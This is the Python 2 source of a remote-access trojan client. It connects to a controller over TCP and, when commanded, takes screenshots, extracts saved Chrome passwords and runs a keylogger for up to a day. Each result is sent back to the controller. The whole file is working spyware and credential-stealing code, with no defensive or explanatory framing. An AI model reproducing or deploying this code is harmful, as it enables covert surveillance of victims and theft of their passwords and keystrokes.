import socket
import signal
import sys
import threading, time
from Queue import Queue
import passwords, keylog
import base64
from PIL import ImageGrab

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)

class Client:

    def __init__(self,ip='localhost',port=5715):
        self.messageQ = Queue()

        TCP_IP = ip
        TCP_PORT = port

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((TCP_IP, TCP_PORT))

    def run(self):

        threading.Thread(target=self.dequeue).start()

        while True:
            size = self.getSizeOfCommand()
            data = self.s.recv(size)
            if data:
                if data == "100":
                    print "hello"
                elif data == "143":
                    print "screenshot"
                    threading.Thread(target=self.screenshot).start()
                elif data == "144":
                    threading.Thread(target=self.passwords).start()
                elif data == "145":
                    threading.Thread(target=self.keylog).start()
                else:
                    print "i don't know that command"
        # self.s.close()

    def getSizeOfCommand(self):
        sizearray = []
        size = 1
        data = self.s.recv(1)
        if data == "!":
            data = None
            while data != "!":
                data = self.s.recv(size)
                if data != "!" and data != "\n":
                    sizearray.append(data)
        size = 0
        for i in range(0,len(sizearray)):
            size += int(sizearray[i]) * pow(10,len(sizearray)-i-1)
        return size

    def screenshot(self):
        #TODO: Fill this in
        ImageGrab.grab().save("C:\Users\Matt\Desktop\scrnsht.png", "png")
        f = open('C:\Users\matt\Desktop\scrnsht.png', 'rb')
        fread = f.read()
        f.close()
        state = "143"
        size = str(len(fread))
        data = fread
        self.enqueue(state,size,data)

    def keylog(self):
        #TODO: Fill this in
        import shutil
        path = "C:\Users\Matt\Desktop\keylogs.txt"
        kl = keylog.keyLogger(path)
        threading.Thread(target=kl.run).start()
        for i in range(0,1440):
            time.sleep(60)
            k = open(path,"rb")
            state = "145"
            data = k.read()
            size = len(data)
            self.enqueue(state,size,data)

    def encrypt(self):
        #TODO: Fill this in
        return

    def passwords(self):
        #TODO: Fill this in
        message = passwords.getChromePasswords()
        state = "144"
        data = "\n".join(message)
        size = len(data)
        self.enqueue(state,size,data)

    def enqueue(self,state,size,data):
        self.messageQ.put((state,size,data))

    def dequeue(self):
        while True:
            data = self.messageQ.get()
            self.sendMessage(data[0],data[1],data[2])
            print "sent"

    def sendMessage(self,state,size,data):
        # self.s.sendall("!" + state + "!" + str(size) + "!" + data)
        self.s.sendall("!" + state + "!" + str(size) + "!" + data)

def main():
    c = Client()
    c.run()

if __name__ == '__main__':
    #signal handlers
    signal.signal(signal.SIGINT, signal_handler)

    #run the program
    main()